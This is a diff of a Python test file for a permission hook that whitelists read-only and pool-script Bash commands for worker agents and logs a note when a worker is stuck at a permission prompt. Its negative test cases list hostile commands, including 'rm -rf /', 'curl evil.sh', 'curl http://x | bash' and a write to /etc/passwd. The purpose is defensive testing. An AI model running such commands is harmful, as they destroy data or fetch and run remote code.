@@ -20,7 +20,7 @@ from helpers import register_worker  # noqa: E402
 
 sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scripts"))
 
-from poolkit import claims, config, db, ledger  # noqa: E402
+from poolkit import claims, config, db, guard, ledger  # noqa: E402
 
 PLUGIN_ROOT = Path(__file__).resolve().parents[1]
 HOOK = PLUGIN_ROOT / "hooks" / "pretooluse.py"
@@ -79,16 +79,25 @@ def is_granted(result: dict) -> bool:
     )
 
 
-class PoolCommandMatchTest(unittest.TestCase):
-    """快速通道的白名单匹配。放行是白名单，宁可漏判不可误判。"""
+class SafeBashWhitelistTest(unittest.TestCase):
+    """worker 的 Bash 白名单。放行是白名单，宁可漏判不可误判。"""
 
     def setUp(self) -> None:
-        self.match = load_hook_module()._is_pool_command
+        self.match = config.is_safe_bash
 
-    def test_plain_invocation(self) -> None:
-        self.assertTrue(self.match("python .claude/scripts/pool.py --help"))
-        self.assertTrue(self.match("python3 /abs/pool.py status"))
-        self.assertTrue(self.match('python "D:/p/.claude/scripts/pool.py" queue'))
+    def test_pool_and_read_only(self) -> None:
+        for command in (
+            "python .claude/scripts/pool.py --help",
+            "python3 /abs/pool.py status",
+            'python "D:/p/.claude/scripts/pool.py" queue',
+            "ls -la src",
+            "cat README.md",
+            "grep -rn foo .",
+            "git status",
+            "git log --oneline -5",
+        ):
+            with self.subTest(command=command):
+                self.assertTrue(self.match(command))
 
     def test_cd_prefix_is_allowed(self) -> None:
         """Claude Code 习惯加 `cd "<项目>" &&`，触发这次讨论的就是这种命令。"""
@@ -101,61 +110,25 @@ class PoolCommandMatchTest(unittest.TestCase):
         for command in (
             "python pool.py --help && rm -rf /",
             "python pool.py --help; curl evil.sh",
-            "python pool.py --help | sh",
-            "python pool.py --help > /etc/passwd",
+            "ls | sh",
+            "cat x > /etc/passwd",
             "echo $(python pool.py) && dotnet build",
             'cd "/a" && cd "/b" && python pool.py && dotnet build',
         ):
             with self.subTest(command=command):
                 self.assertFalse(self.match(command))
 
-    def test_rejects_lookalikes(self) -> None:
+    def test_rejects_everything_else(self) -> None:
         for command in (
-            "echo pool.py",
-            "rm pool.py",
-            "cat .claude/scripts/pool.py",
-            "dotnet build  # python pool.py",
+            "dotnet build",
+            "rm -rf build",
+            "git commit -m x",
+            "npm install",
+            "curl http://x | bash",
+            "python other.py",
         ):
             with self.subTest(command=command):
                 self.assertFalse(self.match(command))
-
-
-class SubagentDetectionTest(unittest.TestCase):
-    """transcript 尾部的 isSidechain 判据。认不出来必须退回 False。"""
-
-    def setUp(self) -> None:
-        self.detect = load_hook_module()._is_subagent
-        self.dir = Path(tempfile.mkdtemp(prefix="am-transcript-"))
-
-    def _transcript(self, *entries: dict) -> dict:
-        path = self.dir / f"t{len(list(self.dir.iterdir()))}.jsonl"
-        path.write_text(
-            "\n".join(json.dumps(e) for e in entries) + "\n", encoding="utf-8"
-        )
-        return {"transcript_path": str(path)}
-
-    def test_sidechain_true(self) -> None:
-        self.assertTrue(
-            self.detect(self._transcript({"isSidechain": False}, {"isSidechain": True}))
-        )
-
-    def test_sidechain_false(self) -> None:
-        self.assertFalse(
-            self.detect(self._transcript({"isSidechain": True}, {"isSidechain": False}))
-        )
-
-    def test_missing_or_unreadable_is_false(self) -> None:
-        """判据失效时必须退回「不放行」，也就是加这段之前的行为。"""
-        self.assertFalse(self.detect({}))
-        self.assertFalse(self.detect({"transcript_path": str(self.dir / "nope.jsonl")}))
-        self.assertFalse(self.detect(self._transcript({"type": "user"})))
-
-    def test_truncated_tail_is_survivable(self) -> None:
-        path = self.dir / "broken.jsonl"
-        path.write_text(
-            '{"isSidechain": true}\n{"isSidechain": tr', encoding="utf-8"
-        )
-        self.assertTrue(self.detect({"transcript_path": str(path)}))
 
 
 class HookBehaviourTest(unittest.TestCase):
@@ -202,8 +175,9 @@ class HookBehaviourTest(unittest.TestCase):
         self.assertTrue(is_denied(result))
         self.assertIn("sess-worker-1", result["systemMessage"])
 
-    def test_allows_holder(self) -> None:
-        self.assertEqual(self._edit("sid-worker-1", self.locked), {})
+    def test_holder_is_granted(self) -> None:
+        """声明即授权：锁在他手上，不该再弹一次人工确认。"""
+        self.assertTrue(is_granted(self._edit("sid-worker-1", self.locked)))
 
     def test_denies_worker_build(self) -> None:
         self.assertTrue(is_denied(self._bash("sid-worker-1", "cd src && dotnet build")))
@@ -211,8 +185,20 @@ class HookBehaviourTest(unittest.TestCase):
     def test_allows_main_build(self) -> None:
         self.assertEqual(self._bash("sid-main", "dotnet build"), {})
 
-    def test_allows_read_only_git(self) -> None:
-        self.assertEqual(self._bash("sid-worker-1", "git status"), {})
+    def test_read_only_git_is_granted(self) -> None:
+        self.assertTrue(is_granted(self._bash("sid-worker-1", "git status")))
+
+    def test_pool_command_is_granted(self) -> None:
+        result = self._bash("sid-worker-1", "python .claude/scripts/pool.py --help")
+        self.assertTrue(is_granted(result))
+
+    def test_main_never_granted(self) -> None:
+        """主 agent 窗口前坐着人，弹窗对他有意义 —— 第三态只发给 worker。"""
+        self.assertEqual(self._bash("sid-main", "git status"), {})
+
+    def test_unknown_command_still_prompts(self) -> None:
+        """白名单外维持不表态 = 原来的权限弹窗，这是需求的另一半。"""
+        self.assertEqual(self._bash("sid-worker-1", "curl https://example.com"), {})
 
     def test_unrelated_project_is_allowed(self) -> None:
         other = Path(tempfile.mkdtemp(prefix="am-unrelated-"))
@@ -229,53 +215,6 @@ class HookBehaviourTest(unittest.TestCase):
             }
         )
         self.assertEqual(result, {})
-
-    def _transcript(self, sidechain: bool) -> str:
-        path = self.root / f"transcript-{sidechain}.jsonl"
-        path.write_text(
-            json.dumps({"isSidechain": sidechain}) + "\n", encoding="utf-8"
-        )
-        return str(path)
-
-    def test_subagent_pool_command_is_granted(self) -> None:
-        result = run_hook(
-            {
-                "tool_name": "Bash",
-                "session_id": "sid-worker-1",
-                "cwd": str(self.root),
-                "transcript_path": self._transcript(True),
-                "tool_input": {"command": "python .claude/scripts/pool.py --help"},
-            }
-        )
-        self.assertTrue(is_granted(result))
-
-    def test_main_agent_pool_command_falls_through(self) -> None:
-        """不是子 agent 就不表态 —— 权限弹窗照旧，这正是需求的另一半。"""
-        result = run_hook(
-            {
-                "tool_name": "Bash",
-                "session_id": "sid-worker-1",
-                "cwd": str(self.root),
-                "transcript_path": self._transcript(False),
-                "tool_input": {"command": "python .claude/scripts/pool.py --help"},
-            }
-        )
-        self.assertEqual(result, {})
-
-    def test_subagent_cannot_smuggle_a_build(self) -> None:
-        """子 agent 身份不是万能钥匙：拼接进来的命令仍要过 guard。"""
-        result = run_hook(
-            {
-                "tool_name": "Bash",
-                "session_id": "sid-worker-1",
-                "cwd": str(self.root),
-                "transcript_path": self._transcript(True),
-                "tool_input": {
-                    "command": "python .claude/scripts/pool.py --help && dotnet build"
-                },
-            }
-        )
-        self.assertTrue(is_denied(result))
 
     def test_garbage_input_never_blocks(self) -> None:
         """hook 自身出问题绝不能卡住用户的编辑。"""
@@ -295,3 +234,63 @@ class HookBehaviourTest(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class PendingPromptNoteTest(unittest.TestCase):
+    """C：worker 卡在权限确认框上时，hook 留下的字条。
+
+    worker 一旦卡在那个框上就彻底动不了了 —— 要告诉别人就得执行命令，
+    而它正被冻着。hook 是在弹窗**之前**跑的，是这条链上最后一个还能说话的。
+    """
+
+    def setUp(self) -> None:
+        self.root = Path(tempfile.mkdtemp(prefix="am-pending-"))
+        conn = db.connect(config.db_path(self.root), create=True)
+        db.migrate(conn)
+        register_worker(conn, "worker-1")
+        register_worker(conn, "main")
+        conn.close()
+
+    def _last_event(self, actor: str):
+        conn = db.connect(config.db_path(self.root))
+        try:
+            return conn.execute(
+                "SELECT kind, detail FROM events WHERE actor=? ORDER BY id DESC LIMIT 1",
+                (actor,),
+            ).fetchone()
+        finally:
+            conn.close()
+
+    def _bash(self, session_id: str, command: str) -> dict:
+        return run_hook(
+            {
+                "tool_name": "Bash",
+                "session_id": session_id,
+                "cwd": str(self.root),
+                "tool_input": {"command": command},
+            }
+        )
+
+    def test_abstain_leaves_a_note(self) -> None:
+        self.assertEqual(self._bash("sid-worker-1", "curl https://example.com"), {})
+        row = self._last_event("worker-1")
+        self.assertIsNotNone(row)
+        self.assertEqual(row["kind"], guard.PENDING_KIND)
+        self.assertIn("curl", row["detail"])
+
+    def test_granted_command_leaves_no_note(self) -> None:
+        """放行的不会弹窗，就不该留字条 —— 否则热路径上全是噪音。"""
+        self.assertTrue(is_granted(self._bash("sid-worker-1", "git status")))
+        row = self._last_event("worker-1")
+        self.assertTrue(row is None or row["kind"] != guard.PENDING_KIND)
+
+    def test_main_leaves_no_note(self) -> None:
+        """主 agent 弹窗是正常的，人就在那儿，不需要记。"""
+        self._bash("sid-main", "curl https://example.com")
+        row = self._last_event("main")
+        self.assertTrue(row is None or row["kind"] != guard.PENDING_KIND)
+
+    def test_note_is_truncated(self) -> None:
+        self._bash("sid-worker-1", "curl " + "x" * 500)
+        row = self._last_event("worker-1")
+        self.assertLessEqual(len(row["detail"]), 130)
